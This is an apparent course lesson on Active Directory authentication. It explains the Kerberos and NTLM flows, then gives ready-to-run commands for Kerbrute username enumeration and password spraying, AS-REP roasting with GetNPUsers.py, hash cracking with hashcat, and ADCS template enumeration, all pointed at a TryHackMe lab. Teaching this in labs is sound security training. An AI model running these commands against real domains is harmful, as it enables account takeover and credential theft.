# Kerberos, NTLM, and ADCS

How authentication works in AD — and the attack surface each protocol creates.

## Kerberos Flow

```
1. Client → KDC (DC): AS-REQ
   "I want to authenticate" + username + timestamp encrypted with user's password hash

2. KDC → Client: AS-REP
   TGT (Ticket Granting Ticket) encrypted with krbtgt account hash
   If user has "no preauthentication" flag: KDC skips step 1 check → AS-REP Roasting

3. Client → KDC: TGS-REQ
   "I want to access service X" + TGT + SPN (Service Principal Name)

4. KDC → Client: TGS (service ticket) encrypted with the service account's hash
   If service account has SPN set → Kerberoasting: request TGS, crack offline

5. Client → Service: present TGS
   Service decrypts with its own hash, grants access
```

## NTLM Flow

```
1. Client → Server: NEGOTIATE
2. Server → Client: CHALLENGE (random 8-byte nonce)
3. Client → Server: AUTHENTICATE (NTHash of password XOR'd with challenge)
```

NTLM weaknesses: no KDC needed (works without AD), hash is reusable (Pass-the-Hash), relay attacks possible (NTLM relay).

## Key Ports

| Port | Protocol |
|------|----------|
| 88 | Kerberos |
| 389 | LDAP |
| 636 | LDAPS |
| 445 | SMB |
| 5985 | WinRM (HTTP) |
| 3389 | RDP |

## Kerbrute — Username Enumeration via Kerberos

```bash
# Enumerate valid usernames (no credentials needed)
kerbrute userenum --dc DC_IP -d corp.local /usr/share/seclists/Usernames/Names/names.txt

# Password spray (1 password, many users — avoid lockout)
kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Password123'
```

## AS-REP Roasting

```bash
# From Linux — find users with preauthentication disabled
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat

# Crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## ADCS (Active Directory Certificate Services)

ADCS is a CA server that issues certificates. Misconfigured templates allow privilege escalation.  
Attack: ESC1–ESC8 vulnerabilities (covered in Phase 13).  
Enumerate with: `Certify.exe find /vulnerable` or `certipy find -u user -p pass -dc-ip DC_IP`.

## Exercise

Complete TryHackMe "Kerberos" room:  
https://tryhackme.com/room/attackingkerberos  

Run Kerbrute against a TryHackMe AD lab to enumerate valid usernames. Try AS-REP roasting — if any accounts are vulnerable, capture and attempt to crack the hash with hashcat.
